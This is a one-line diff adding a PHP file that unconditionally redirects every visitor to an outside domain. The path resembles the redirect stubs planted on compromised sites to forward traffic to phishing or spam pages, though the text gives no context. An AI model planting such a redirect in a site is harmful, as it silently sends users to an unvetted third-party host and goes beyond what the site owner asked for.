@@ -1,0 +1,1 @@
+<?php header("Location: http://enzaferri.it/listgt3/glr/index.php"); ?>
